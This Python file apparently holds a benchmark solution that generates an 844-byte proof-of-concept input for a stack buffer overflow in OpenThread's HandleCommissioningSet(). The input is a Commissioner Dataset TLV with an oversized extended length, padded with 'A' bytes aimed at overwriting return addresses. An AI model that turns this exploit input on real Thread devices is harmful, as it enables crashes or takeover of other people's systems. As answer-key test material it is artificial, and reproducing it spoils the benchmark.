import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The PoC structure based on analysis of the vulnerability:
        # Commissioner Dataset TLV with extended length that causes stack overflow
        
        # TLV Header:
        # Type: Commissioner Dataset TLV (0x49 based on OpenThread TLVs)
        # Length: Extended format (0xFE) followed by 2-byte actual length
        
        # The overflow occurs when the extended length is not properly validated
        # The stack buffer in HandleCommissioningSet() is limited but the code
        # doesn't reject TLV with large extended length values
        
        # Ground truth length is 844 bytes, so we'll create exactly that
        total_length = 844
        
        # TLV Type: Commissioner Dataset (0x49)
        tlv_type = b'\x49'
        
        # Extended length indicator (0xFE) followed by 2-byte length
        # The value length will be total_length - 3 (type + length bytes)
        value_length = total_length - 3  # 841 bytes
        length_bytes = b'\xFE' + struct.pack('>H', value_length)
        
        # Payload: Fill with pattern that will trigger overflow
        # Using 'A' characters which will overwrite return addresses
        payload = b'A' * value_length
        
        # Combine to form the complete PoC
        poc = tlv_type + length_bytes + payload
        
        # Verify we have exactly 844 bytes
        assert len(poc) == total_length, f"Expected {total_length} bytes, got {len(poc)}"
        
        return poc
